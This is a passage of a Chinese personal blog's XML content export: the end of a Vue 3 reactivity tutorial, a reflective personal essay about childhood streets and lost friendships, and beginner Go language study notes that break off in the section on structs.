class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;script setup&gt;</span><br><span class="line">import &#123; ref &#125; from &#x27;vue&#x27;</span><br><span class="line"></span><br><span class="line">const count = ref(0)</span><br><span class="line"></span><br><span class="line">function increment() &#123;</span><br><span class="line">  count.value++</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;button @click=&quot;increment&quot;&gt;</span><br><span class="line">    &#123;&#123; count &#125;&#125;</span><br><span class="line">  &lt;/button&gt;</span><br><span class="line">&lt;/template&gt;</span><br></pre></td></tr></table></figure><script setup> 中的顶层的导入、声明的变量和函数可在同一组件的模板中直接使用。你可以理解为模板是在同一作用域内声明的一个 JavaScript 函数——它自然可以访问与它一起声明的所有内容。也就是说不用暴露，即`return`了#### `reactive()` 还有另一种声明响应式状态的方式，即使用 `reactive()` API。与将内部值包装在特殊对象中的 ref 不同，`reactive()` 将使对象本身具有响应性：<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; reactive &#125; <span class="keyword">from</span> <span class="string">&#x27;vue&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> state = <span class="title function_">reactive</span>(&#123; <span class="attr">count</span>: <span class="number">0</span> &#125;)</span><br></pre></td></tr></table></figure>在模板中使用：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;button @click=&quot;state.count++&quot;&gt;</span><br><span class="line">  &#123;&#123; state.count &#125;&#125;</span><br><span class="line">&lt;/button&gt;</span><br></pre></td></tr></table></figure>响应式对象是 `JavaScript 代理`，其行为就和普通对象一样。不同的是，Vue 能够拦截对响应式对象所有属性的访问和修改，以便进行依赖追踪和触发更新。`reactive()` 将深层地转换对象：当访问嵌套对象时，它们也会被 `reactive()` 包装。当 ref 的值是一个对象时，`ref()` 也会在内部调用它。与浅层 ref 类似，这里也有一个 `shallowReactive()` API 可以选择退出深层响应性。]]></content>
      
      
      <categories>
          
          <category> 开发 </category>
          
          <category> 前端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 前端 </tag>
            
            <tag> Vue </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>腐烂的街道有我很甜的回忆</title>
      <link href="/2023/11/21/%E8%85%90%E7%83%82%E7%9A%84%E8%A1%97%E9%81%93%E6%9C%89%E6%88%91%E5%BE%88%E7%94%9C%E7%9A%84%E5%9B%9E%E5%BF%86/"/>
      <url>/2023/11/21/%E8%85%90%E7%83%82%E7%9A%84%E8%A1%97%E9%81%93%E6%9C%89%E6%88%91%E5%BE%88%E7%94%9C%E7%9A%84%E5%9B%9E%E5%BF%86/</url>
      
        <content type="html"><![CDATA[<p>喝咖啡喝多了，又开始有很严重的躯体反应。做什么事情都总是半途而废，说好了不熬夜不喝咖啡不再堕落，可是决定好做的事情总是过几天就打破。很想好好生活，想起以前无聊一整天什么也不干，几个朋友凑一起去废墟探险只为了消磨那几十分钟的时间。大晚上的一个人在很空旷很空旷的平地上，朋友都回去了，那个时候脑子里面什么也没想，就这样逛着，除了时间在走其他什么都没发生。那个时候好像没有朋友，小学也没有，初中总算有了吧，高中呢，朋友很多，朋友很少，想说很多话，说不出口。已经忘记当时到底在想什么了，可能什么也没有想吧，反正那个时候不会想着要挣多少钱，不会想着要把谁给比下去，就是觉得时间过的好慢。时间过得好快。臭弟弟都已经跟我一样高了，会做数学题可以谈恋爱了，我也变了，忘记了好多事情啊，忘记了以前羡慕班里有钱人家的孩子幻想着和他互换身份，忘记了公园里面幼稚的和朋友吵架，去她家里和她一起吃饭一起洗澡一起睡觉，忘记了偷偷喜欢一部电视剧一个明星不敢告诉任何人，忘记了在KTV里面和不知道能不能算是我朋友的两个人唱着听不懂的韩语，再后来，自己经历了那些事情，第一次无声的哭泣，经历了太多事情遇见太多的人，我忘记的越多，就越是成为自己口中的烂人。以前的日记里写的总是所谓的爱情和那些没有意义的意义，现在的日记里面是焦躁和麻木和悔恨。我在悔恨什么，高三以前的人生我从不曾后悔任何一件事情哪怕是那件我至今人记得的特别特别丢脸的小事情，可是这两年呢，我说不上来后不后悔，我只觉得我身边越来越黑了，希望有光的时候，我却低下了头。</p><p>好像有很多东西说不出来，他们都说我变了，可我到底怎么变了，我还是像原来一样一个人骑着自行车走上那些熟悉的街道，我还是像原来一样白天睡大觉晚上慌得睡不着起床整夜整夜的学习，我还是拒绝平庸。我知道我就是变了。</p><p>我不再快乐，也流不出泪了。</p><p>看见那些街道被围起来了，我不知道到底要不要希望它被建设的更好，我就是希望曾经爬过的那道墙可以一直不被推倒，那些朋友呢，我好像只记得一个人的名字了，那个时候女生们都喜欢他，他也好像真的很耀眼，我想再回去看看他长什么样子。我想再回去看看那个时候的天空有没有更蓝。</p>]]></content>
      
      
      <categories>
          
          <category> 文学 </category>
          
          <category> 随笔 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 随笔 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Golang</title>
      <link href="/2023/11/21/Golang/"/>
      <url>/2023/11/21/Golang/</url>
      
        <content type="html"><![CDATA[<h4 id="语言结构"><a href="#语言结构" class="headerlink" title="语言结构"></a>语言结构</h4><p>Go 语言的基础组成有以下几个部分：</p><ul><li>包声明</li><li>引入包</li><li>函数</li><li>变量</li><li>语句 &amp; 表达式</li><li>注释</li></ul><p>来看一个helloworld代码</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main     </span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span>         </span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span>&#123;          <span class="comment">//需要注意的是 &#123; 不能单独放在一行</span></span><br><span class="line">    <span class="comment">/*第一个Golang程序*/</span></span><br><span class="line">    fmt.Println(<span class="string">&quot;Hello,World!&quot;</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>第一行<code>package main</code>定义包名，&#x3D;&#x3D;必须&#x3D;&#x3D;在源文件中非注释的第一行指明文件属于那个包。<ul><li>package main 表示一个可独立执行的程序，每个Go应用程序都包含一个名为main的包</li></ul></li><li><code>import fmt</code>告诉Go编译器这个程序需要使用fmt包，fmt包实现了格式化I&#x2F;O(输入&#x2F;输出)的函数</li><li><code>func main()</code>是程序开始执行的函数。main 函数是每一个可执行程序所必须包含的，一般来说都是在启动后第一个执行的函数（如果有 init() 函数则会先执行该函数）。</li><li><code>fmt.Println(...) </code>可以将字符串输出到控制台，并在最后自动增加换行字符 \n。 使用 <code>fmt.Print(&quot;hello, world\n&quot;)</code> 可以得到相同的结果。</li></ul><blockquote><p>当标识符（包括常量、变量、类型、函数名、结构字段等等）以一个大写字母开头，如：Group1，那么使用这种形式的标识符的对象就可以被外部包的代码所使用（客户端程序需要先导入这个包），这被称为导出（像面向对象语言中的 public）；标识符如果以小写字母开头，则对包外是不可见的，但是他们在整个包的内部是可见并且可用的（像面向对象语言中的 protected  ）。</p></blockquote><h4 id="程序执行"><a href="#程序执行" class="headerlink" title="程序执行"></a>程序执行</h4><p><code>go run 1.go</code> 可以直接执行go</p><p><code>go build 1.go</code> 可以生成二进制可执行文件</p><p>​<code>go bulid hello.go</code></p><p>​<code>./hello</code></p><h4 id="基础语法"><a href="#基础语法" class="headerlink" title="基础语法"></a>基础语法</h4><h5 id="Go标记"><a href="#Go标记" class="headerlink" title="Go标记"></a>Go标记</h5><p>Go 程序可以由多个标记组成，可以是关键字，标识符，常量，字符串，符号。如以下 GO 语句由 6 个标记组成：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fmt.Println(<span class="string">&quot;Hello, World!&quot;</span>)</span><br></pre></td></tr></table></figure><p>6 个标记是(每行一个)：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">fmt</span><br><span class="line">.</span><br><span class="line">Println</span><br><span class="line">(</span><br><span class="line"><span class="string">&quot;Hello, World!&quot;</span></span><br><span class="line">)</span><br></pre></td></tr></table></figure><h5 id="Go的空格"><a href="#Go的空格" class="headerlink" title="Go的空格"></a>Go的空格</h5><p>在 Go 语言中，空格通常用于分隔标识符、关键字、运算符和表达式，以提高代码的可读性。</p><p>Go 语言中变量的声明必须使用空格隔开，如：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> x <span class="type">int</span></span><br><span class="line"><span class="keyword">const</span> Pi <span class="type">float64</span> = <span class="number">3.14159265358979323846</span></span><br></pre></td></tr></table></figure><h5 id="格式化字符串"><a href="#格式化字符串" class="headerlink" title="格式化字符串"></a>格式化字符串</h5><p>Go 语言中使用 fmt.Sprintf 或 fmt.Printf 格式化字符串并赋值给新串：</p><ul><li><strong>Sprintf</strong> 根据格式化参数生成格式化的字符串并返回该字符串。</li><li><strong>Printf</strong> 根据格式化参数生成格式化的字符串并写入标准输出。</li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">    <span class="string">&quot;fmt&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">   <span class="comment">// %d 表示整型数字，%s 表示字符串</span></span><br><span class="line">    <span class="keyword">var</span> stockcode=<span class="number">123</span></span><br><span class="line">    <span class="keyword">var</span> enddate=<span class="string">&quot;2020-12-31&quot;</span></span><br><span class="line">    <span class="keyword">var</span> url=<span class="string">&quot;Code=%d&amp;endDate=%s&quot;</span></span><br><span class="line">    <span class="keyword">var</span> target_url=fmt.Sprintf(url,stockcode,enddate)     <span class="comment">//根据格式化参数生成字符串并返回</span></span><br><span class="line">    fmt.Println(target_url)          <span class="comment">//根据生成的字符串写入标准输入</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="数据类型"><a href="#数据类型" class="headerlink" title="数据类型"></a>数据类型</h4><ul><li>布尔型</li><li>数字型</li><li>字符串型      &#x3D;&#x3D;用双引号表示，在 Go 中，单引号用于表示字符（<code>rune</code>），而不是字符串。&#x3D;&#x3D;</li><li>派生类型<ul><li>指针类型</li><li>数组类型</li><li>结构化类型(struct)</li><li>Channel类型</li><li>函数类型</li><li>切片类型</li><li>接口类型(interface)</li><li>Map类型</li></ul></li></ul><h4 id="语言变量"><a href="#语言变量" class="headerlink" title="语言变量"></a>语言变量</h4><blockquote><p> 声明变量的一般形式是使用 var 关键字：</p></blockquote><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> identifier <span class="keyword">type</span></span><br></pre></td></tr></table></figure><p>可以一次声明多个变量：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> identifier1, identifier2 <span class="keyword">type</span></span><br></pre></td></tr></table></figure><blockquote><p> 还可以根据值自行判定类型</p></blockquote><p><code>var v_name = value</code></p><blockquote><p>还可以使用:&#x3D;</p></blockquote><p>intVal :&#x3D; 1 相等于：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> intVal <span class="type">int</span> </span><br><span class="line">intVal =<span class="number">1</span> </span><br></pre></td></tr></table></figure><p>可以将 var f string &#x3D; “Runoob” 简写为 f :&#x3D; “Runoob”：</p><blockquote><p>多变量声明</p></blockquote><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//类型相同多个变量, 非全局变量</span></span><br><span class="line"><span class="keyword">var</span> vname1, vname2, vname3 <span class="keyword">type</span></span><br><span class="line">vname1, vname2, vname3 = v1, v2, v3</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> vname1, vname2, vname3 = v1, v2, v3 <span class="comment">// 和 python 很像,不需要显示声明类型，自动推断</span></span><br><span class="line"></span><br><span class="line">vname1, vname2, vname3 := v1, v2, v3 <span class="comment">// 出现在 := 左侧的变量不应该是已经被声明过的，否则会导致编译错误</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 这种因式分解关键字的写法一般用于声明全局变量</span></span><br><span class="line"><span class="keyword">var</span> (</span><br><span class="line">    vname1 v_type1</span><br><span class="line">    vname2 v_type2</span><br><span class="line">)</span><br></pre></td></tr></table></figure><h5 id="引用类型"><a href="#引用类型" class="headerlink" title="引用类型"></a>引用类型</h5><p>当使用等号 <code>=</code> 将一个变量的值赋值给另一个变量时，如：<code>j = i</code>，实际上是在内存中将 i 的值进行了拷贝</p><p>可以通过 &amp;i 来获取变量 i 的内存地址</p><p>值类型变量的值存储在堆中。</p><p>更复杂的数据通常会需要使用多个字，这些数据一般使用引用类型保存。</p><blockquote><p>当使用赋值语句 r2 &#x3D; r1 时，只有引用（地址）被复制。</p><p>如果 r1 的值被改变了，那么这个值的所有引用都会指向被修改后的内容，在这个例子中，r2 也会受到影响。</p></blockquote><h4 id="语言常量"><a href="#语言常量" class="headerlink" title="语言常量"></a>语言常量</h4><p>常量是一个简单值的标识符，在程序运行时，不会被修改的量。</p><p>常量中的数据类型只可以是布尔型、数字型（整数型、浮点型和复数）和字符串型。</p><p>常量的定义格式：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> identifier [<span class="keyword">type</span>] = value</span><br></pre></td></tr></table></figure><h5 id="iota"><a href="#iota" class="headerlink" title="iota"></a>iota</h5><blockquote><p> iota，特殊常量，可以认为是一个可以被编译器修改的常量。</p></blockquote><p>iota 在 const关键字出现时将被重置为 0(const 内部的第一行之前)，const 中每新增一行常量声明将使 iota 计数一次(iota 可理解为 const 语句块中的行索引)。</p><p>iota 可以被用作枚举值：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> (</span><br><span class="line">    a = <span class="literal">iota</span></span><br><span class="line">    b = <span class="literal">iota</span></span><br><span class="line">    c = <span class="literal">iota</span></span><br><span class="line">)</span><br></pre></td></tr></table></figure><p>第一个 iota 等于 0，每当 iota 在新的一行被使用时，它的值都会自动加 1；所以 a&#x3D;0, b&#x3D;1, c&#x3D;2 可以简写为如下形式：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> (</span><br><span class="line">    a = <span class="literal">iota</span></span><br><span class="line">    b</span><br><span class="line">    c</span><br><span class="line">)</span><br></pre></td></tr></table></figure><h4 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h4><p>函数是基本的代码块，用于执行一个任务。</p><p>Go 语言最少有个 main() 函数。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">function_name</span><span class="params">( [parameter list] )</span></span> [return_types] &#123;</span><br><span class="line">   函数体</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><h6 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h6></blockquote><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*函数返回两个数的最大值*/</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">max</span><span class="params">(num1, num2 <span class="type">int</span>)</span></span> <span class="type">int</span> &#123;</span><br><span class="line">    <span class="keyword">var</span> result <span class="type">int</span>;</span><br><span class="line">    <span class="keyword">if</span>(num1 &gt; num2) &#123;</span><br><span class="line">        result = num1</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        result = num2</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><h6 id="函数调用"><a href="#函数调用" class="headerlink" title="函数调用"></a>函数调用</h6></blockquote><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    <span class="keyword">var</span> a <span class="type">int</span> = <span class="number">100</span></span><br><span class="line">    <span class="keyword">var</span> b <span class="type">int</span> = <span class="number">200</span></span><br><span class="line">    <span class="keyword">var</span> ret <span class="type">int</span></span><br><span class="line">    ret = max(a, b)</span><br><span class="line">    fmt.Printf(<span class="string">&quot;最大值是：%d\n&quot;</span>,ret)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">max</span><span class="params">(num1, num2 <span class="type">int</span>)</span></span> <span class="type">int</span> &#123;</span><br><span class="line">    <span class="keyword">var</span> result <span class="type">int</span>;</span><br><span class="line">    <span class="keyword">if</span>(num1 &gt; num2) &#123;</span><br><span class="line">        result = num1</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        result = num2</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><p>go函数可以返回多个值</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">swap</span><span class="params">(x, y <span class="type">string</span>)</span></span> (<span class="type">string</span>, <span class="type">string</span>) &#123;</span><br><span class="line">   <span class="keyword">return</span> y, x</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><h4 id="数组"><a href="#数组" class="headerlink" title="数组"></a>数组</h4><p>Go 语言数组声明需要指定元素类型及元素个数，语法格式如下：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> arrayName [size]dataType</span><br></pre></td></tr></table></figure><p>其中，<strong>arrayName</strong> 是数组的名称，<strong>size</strong> 是数组的大小，<strong>dataType</strong> 是数组中元素的数据类型。</p><p>以下定义了数组 balance 长度为 10 类型为 float32：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> balance [<span class="number">10</span>]<span class="type">float32</span></span><br></pre></td></tr></table></figure><blockquote><h6 id="直接定义的时候初始化"><a href="#直接定义的时候初始化" class="headerlink" title="直接定义的时候初始化"></a>直接定义的时候初始化</h6></blockquote><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> numbers = [<span class="number">5</span>]<span class="type">int</span>&#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>&#125;</span><br></pre></td></tr></table></figure><p>以上代码声明一个大小为 5 的整数数组，并将其中的元素分别初始化为 1、2、3、4 和 5。</p><p>另外，还可以使用 :&#x3D; 简短声明语法来声明和初始化数组：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">numbers := [<span class="number">5</span>]<span class="type">int</span>&#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>&#125;</span><br></pre></td></tr></table></figure><p><strong>注意：</strong>在 Go 语言中，数组的大小是类型的一部分，因此不同大小的数组是不兼容的，也就是说 [5]int 和 [10]int 是不同的类型。</p><blockquote><h6 id="指定下标的初始化"><a href="#指定下标的初始化" class="headerlink" title="指定下标的初始化"></a>指定下标的初始化</h6></blockquote><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">如果设置了数组的长度，我们还可以通过指定下标来初始化元素：</span><br><span class="line"></span><br><span class="line"><span class="comment">//  将索引为 1 和 3 的元素初始化</span></span><br><span class="line">balance := [<span class="number">5</span>]<span class="type">int</span>&#123;<span class="number">1</span>:<span class="number">2</span>,<span class="number">3</span>:<span class="number">7</span>&#125;</span><br></pre></td></tr></table></figure><blockquote><h6 id="实例-1"><a href="#实例-1" class="headerlink" title="实例"></a>实例</h6></blockquote><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">   <span class="keyword">var</span> n [<span class="number">10</span>]<span class="type">int</span> <span class="comment">/* n 是一个长度为 10 的数组 */</span></span><br><span class="line">   <span class="keyword">var</span> i,j <span class="type">int</span></span><br><span class="line"></span><br><span class="line">   <span class="comment">/* 为数组 n 初始化元素 */</span>         </span><br><span class="line">   <span class="keyword">for</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++ &#123;</span><br><span class="line">      n[i] = i + <span class="number">100</span> <span class="comment">/* 设置元素为 i + 100 */</span></span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="comment">/* 输出每个数组元素的值 */</span></span><br><span class="line">   <span class="keyword">for</span> j = <span class="number">0</span>; j &lt; <span class="number">10</span>; j++ &#123;</span><br><span class="line">      fmt.Printf(<span class="string">&quot;Element[%d] = %d\n&quot;</span>, j, n[j] )</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="指针"><a href="#指针" class="headerlink" title="指针"></a>指针</h4><ul><li>go中取地址符号是 <code>&amp;</code>, 放到一个变量前使用就会返回相应变量的内存地址</li></ul><p>看一个实例</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">   <span class="keyword">var</span> a <span class="type">int</span> = <span class="number">10</span>   </span><br><span class="line"></span><br><span class="line">   fmt.Printf(<span class="string">&quot;变量的地址: %x\n&quot;</span>, &amp;a  )</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//变量的地址: 20818a220</span></span><br></pre></td></tr></table></figure><blockquote><h6 id="声明"><a href="#声明" class="headerlink" title="声明"></a>声明</h6></blockquote><p>一个指针变量指向了一个值的内存地址。</p><p>类似于变量和常量，在使用指针前你需要声明指针。指针声明格式如下：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> var_name *<span class="keyword">var</span>-<span class="keyword">type</span></span><br></pre></td></tr></table></figure><p>var-type 为指针类型，var_name 为指针变量名，* 号用于指定变量是作为一个指针。以下是有效的指针声明：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> ip *<span class="type">int</span>        <span class="comment">/* 指向整型*/</span></span><br><span class="line"><span class="keyword">var</span> fp *<span class="type">float32</span>    <span class="comment">/* 指向浮点型 */</span></span><br></pre></td></tr></table></figure><blockquote><h6 id="使用流程"><a href="#使用流程" class="headerlink" title="使用流程"></a>使用流程</h6></blockquote><p>指针使用流程：</p><ul><li>定义指针变量。</li><li>为指针变量赋值。</li><li>访问指针变量中指向地址的值。</li></ul><p>在指针类型前面加上 * 号（前缀）来获取指针所指向的内容。</p><blockquote><h6 id="实例-2"><a href="#实例-2" class="headerlink" title="实例"></a>实例</h6></blockquote><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main </span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    <span class="keyword">var</span> a <span class="type">int</span> = <span class="number">20</span>   <span class="comment">/* 声明实际变量 */</span></span><br><span class="line">    <span class="keyword">var</span> p *<span class="type">int</span>    <span class="comment">/* 声明指针变量 */</span></span><br><span class="line">    p = &amp;a    <span class="comment">/* 指针变量的存储地址 */</span></span><br><span class="line">fmt.Printf(<span class="string">&quot;a 变量的地址是: %x\n&quot;</span>, &amp;a  )   <span class="comment">//20818a220</span></span><br><span class="line">    fmt.Printf(<span class="string">&quot;ip 变量储存的指针地址: %x\n&quot;</span>, p )    <span class="comment">//20818a220</span></span><br><span class="line">    fmt.Printf(<span class="string">&quot;*p 变量的值: %d\n&quot;</span>, *p )          <span class="comment">//20 </span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="结构体"><a href="#结构体" class="headerlink" title="结构体"></a>结构体</h4><blockquote><h6 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h6></blockquote><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> struct_variable_type <span class="keyword">struct</span> &#123;</span><br><span class="line">   member definition</span><br><span class="line">   member definition</span><br><span class="line">   ...</span><br><span class="line">   member definition</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>一旦定义了结构体类型，它就能用于变量的声明，语法格式如下：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">variable_name := structure_variable_type &#123;value1, value2...valuen&#125;</span><br><span class="line">或</span><br><span class="line">variable_name := structure_variable_type &#123; key1: value1, key2: value2..., keyn: 